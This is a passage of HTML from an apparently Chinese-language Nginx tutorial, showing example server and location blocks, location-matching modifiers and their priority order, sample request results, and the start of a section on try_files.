title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nserver {\r\n  listen 80;\r\n  server_name netguru.co;\r\n  root /var/www/netguru.co;\r\n\r\n  location / {\r\n    return 200 \"root\";\r\n  }\r\n\r\n  location /foo/ {\r\n    return 200 \"foo\";\r\n  }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ee580056794-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32ee580056794-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ee580056794-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32ee580056794-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ee580056794-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32ee580056794-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ee580056794-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32ee580056794-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ee580056794-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32ee580056794-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ee580056794-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32ee580056794-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32ee580056794-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ee580056794-1\"><span class=\"crayon-e\">server</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32ee580056794-2\">  <span class=\"crayon-i\">listen</span> <span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ee580056794-3\">  <span class=\"crayon-v\">server</span><span class=\"crayon-sy\">_</span>name <span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32ee580056794-4\">  <span class=\"crayon-i\">root</span> <span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">www</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ee580056794-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32ee580056794-6\">  <span class=\"crayon-e\">location</span> <span class=\"crayon-o\">/</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ee580056794-7\">    <span class=\"crayon-st\">return</span> <span class=\"crayon-cn\">200</span> <span class=\"crayon-s\">\"root\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32ee580056794-8\">  <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ee580056794-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32ee580056794-10\">  <span class=\"crayon-e\">location</span> <span class=\"crayon-o\">/</span><span class=\"crayon-e\">foo</span><span class=\"crayon-o\">/</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ee580056794-11\">    <span class=\"crayon-st\">return</span> <span class=\"crayon-cn\">200</span> <span class=\"crayon-s\">\"foo\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32ee580056794-12\">  <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32ee580056794-13\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32f1930919119\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nnetguru.co:80   /       # =&gt; \"root\"\r\nnetguru.co:80   /foo    # =&gt; \"foo\"\r\nnetguru.co:80   /foo123 # =&gt; \"foo\"\r\nnetguru.co:80   /bar    # =&gt; \"root\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f1930919119-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32f1930919119-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f1930919119-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32f1930919119-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f1930919119-1\"><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span>   <span class=\"crayon-o\">/</span>       <span class=\"crayon-p\"># =&gt; \"root\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32f1930919119-2\"><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span>   <span class=\"crayon-o\">/</span><span class=\"crayon-i\">foo</span>    <span class=\"crayon-p\"># =&gt; \"foo\"</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f1930919119-3\"><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span>   <span class=\"crayon-o\">/</span><span class=\"crayon-i\">foo123</span> <span class=\"crayon-p\"># =&gt; \"foo\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32f1930919119-4\"><span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span>   <span class=\"crayon-o\">/</span><span class=\"crayon-i\">bar</span>    <span class=\"crayon-p\"># =&gt; \"root\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>Nginx 也提供了一些修饰符，可用于连接 location。这些修饰符将影响 location 模块使用的地方，因为每个修饰符都分配了优先级。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32f4676212209\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n=           - Exact match\r\n^~          - Preferential match\r\n~ &amp;&amp; ~*     - Regex match\r\nno modifier - Prefix match</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f4676212209-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32f4676212209-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f4676212209-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32f4676212209-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f4676212209-1\"><span class=\"crayon-o\">=</span>           <span class=\"crayon-o\">-</span> <span class=\"crayon-i\">Exact</span> <span class=\"crayon-v\">match</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32f4676212209-2\"><span class=\"crayon-o\">^</span><span class=\"crayon-o\">~</span>          <span class=\"crayon-o\">-</span> <span class=\"crayon-i\">Preferential</span> <span class=\"crayon-v\">match</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f4676212209-3\"><span class=\"crayon-o\">~</span> <span class=\"crayon-o\">&amp;&amp;</span> <span class=\"crayon-o\">~</span><span class=\"crayon-o\">*</span>     <span class=\"crayon-o\">-</span> <span class=\"crayon-i\">Regex</span> <span class=\"crayon-e\">match</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32f4676212209-4\"><span class=\"crayon-i\">no</span> <span class=\"crayon-i\">modifier</span> <span class=\"crayon-o\">-</span> <span class=\"crayon-i\">Prefix</span> <span class=\"crayon-v\">match</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>Nginx 会先检查精确匹配。如果找不到，我们会找优先级最高的。如果这个匹配依然失败，正则表达式匹配将按照出现的顺序进行测试。至少，最后一个前缀匹配将被使用。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32f7429808673\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlocation /match {\r\n  return 200 'Prefix match: matches everything that starting with /match';\r\n}\r\n\r\nlocation ~* /match[0-9] {\r\n  return 200 'Case insensitive regex match';\r\n}\r\n\r\nlocation ~ /MATCH[0-9] {\r\n  return 200 'Case sensitive regex match';\r\n}\r\n\r\nlocation ^~ /match0 {\r\n  return 200 'Preferential match';\r\n}\r\n\r\nlocation = /match {\r\n  return 200 'Exact match';\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f7429808673-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32f7429808673-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f7429808673-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32f7429808673-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f7429808673-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32f7429808673-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f7429808673-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32f7429808673-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f7429808673-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32f7429808673-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f7429808673-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32f7429808673-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f7429808673-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32f7429808673-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f7429808673-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32f7429808673-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f7429808673-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32f7429808673-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32f7429808673-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f7429808673-1\"><span class=\"crayon-e\">location</span> <span class=\"crayon-o\">/</span><span class=\"crayon-e\">match</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32f7429808673-2\">  <span class=\"crayon-st\">return</span> <span class=\"crayon-cn\">200</span> <span class=\"crayon-s\">'Prefix match: matches everything that starting with /match'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f7429808673-3\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32f7429808673-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f7429808673-5\"><span class=\"crayon-e\">location</span> <span class=\"crayon-o\">~</span><span class=\"crayon-o\">*</span> <span class=\"crayon-o\">/</span><span class=\"crayon-e\">match</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">]</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32f7429808673-6\">  <span class=\"crayon-st\">return</span> <span class=\"crayon-cn\">200</span> <span class=\"crayon-s\">'Case insensitive regex match'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f7429808673-7\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32f7429808673-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f7429808673-9\"><span class=\"crayon-e\">location</span> <span class=\"crayon-o\">~</span> <span class=\"crayon-o\">/</span><span class=\"crayon-e\">MATCH</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">]</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32f7429808673-10\">  <span class=\"crayon-st\">return</span> <span class=\"crayon-cn\">200</span> <span class=\"crayon-s\">'Case sensitive regex match'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f7429808673-11\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32f7429808673-12\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f7429808673-13\"><span class=\"crayon-e\">location</span> <span class=\"crayon-o\">^</span><span class=\"crayon-o\">~</span> <span class=\"crayon-o\">/</span><span class=\"crayon-e\">match0</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32f7429808673-14\">  <span class=\"crayon-st\">return</span> <span class=\"crayon-cn\">200</span> <span class=\"crayon-s\">'Preferential match'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f7429808673-15\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32f7429808673-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f7429808673-17\"><span class=\"crayon-i\">location</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-o\">/</span><span class=\"crayon-e\">match</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32f7429808673-18\">  <span class=\"crayon-st\">return</span> <span class=\"crayon-cn\">200</span> <span class=\"crayon-s\">'Exact match'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32f7429808673-19\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32fb597790346\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/match/    # =&gt; 'Exact match'\r\n/match0    # =&gt; 'Preferential match'\r\n/match1    # =&gt; 'Case insensitive regex match'\r\n/MATCH1    # =&gt; 'Case sensitive regex match'\r\n/match-abc # =&gt; 'Prefix match: matches everything that starting with /match'</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32fb597790346-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32fb597790346-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32fb597790346-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37c4d32fb597790346-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37c4d32fb597790346-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32fb597790346-1\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">match</span><span class=\"crayon-o\">/</span>    <span class=\"crayon-p\"># =&gt; 'Exact match'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32fb597790346-2\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">match0</span>    <span class=\"crayon-p\"># =&gt; 'Preferential match'</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32fb597790346-3\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">match1</span>    <span class=\"crayon-p\"># =&gt; 'Case insensitive regex match'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37c4d32fb597790346-4\"><span class=\"crayon-o\">/</span><span class=\"crayon-i\">MATCH1</span>    <span class=\"crayon-p\"># =&gt; 'Case sensitive regex match'</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37c4d32fb597790346-5\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">match</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">abc</span> <span class=\"crayon-p\"># =&gt; 'Prefix match: matches everything that starting with /match'</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<h3><code>try_files</code> 指令</h3>\n<p>尝试不同的路径，找到一个路径就返回。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37c4d32fe668932049\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntry_files $uri index.html =404;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" 